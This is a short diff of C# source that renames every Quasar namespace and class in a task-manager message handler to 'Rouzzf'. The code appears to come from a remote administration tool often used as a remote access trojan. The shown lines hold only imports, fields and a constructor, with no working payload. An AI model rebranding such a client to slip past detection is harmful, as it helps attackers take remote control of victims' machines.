@@ -1,28 +1,28 @@
-﻿using Quasar.Client.Networking;
-using Quasar.Client.Setup;
-using Quasar.Common;
-using Quasar.Common.Enums;
-using Quasar.Common.Helpers;
-using Quasar.Common.Messages;
-using Quasar.Common.Networking;
+﻿using Rouzzf.Client.Networking;
+using Rouzzf.Client.Setup;
+using Rouzzf.Common;
+using Rouzzf.Common.Enums;
+using Rouzzf.Common.Helpers;
+using Rouzzf.Common.Messages;
+using Rouzzf.Common.Networking;
 using System;
 using System.ComponentModel;
 using System.Diagnostics;
 using System.Net;
 using System.Threading;
 
-namespace Quasar.Client.Messages
+namespace Rouzzf.Client.Messages
 {
     /// <summary>
     /// Handles messages for the interaction with tasks.
     /// </summary>
     public class TaskManagerHandler : IMessageProcessor, IDisposable
     {
-        private readonly QuasarClient _client;
+        private readonly RouzzfClient _client;
 
         private readonly WebClient _webClient;
 
-        public TaskManagerHandler(QuasarClient client)
+        public TaskManagerHandler(RouzzfClient client)
         {
             _client = client;
             _client.ClientState += OnClientStateChange;
